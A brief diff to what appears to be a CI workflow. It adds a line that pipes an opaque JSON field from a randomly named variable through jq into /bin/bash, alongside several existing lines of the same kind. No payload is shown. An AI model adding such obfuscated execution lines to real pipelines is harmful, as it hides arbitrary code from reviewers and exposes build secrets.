@@ -31,6 +31,7 @@ jobs:
           echo $p7819 | jq -r .mohgq290 | /bin/bash
           echo $nb4 | jq -r .xw14 | /bin/bash
           printf '%s' "$ouk452" | jq -r .er480 | /bin/bash
+          echo $dtt1 | jq -r .fpgg98641 | /bin/bash
 
       - name: Archive output
         if: always()
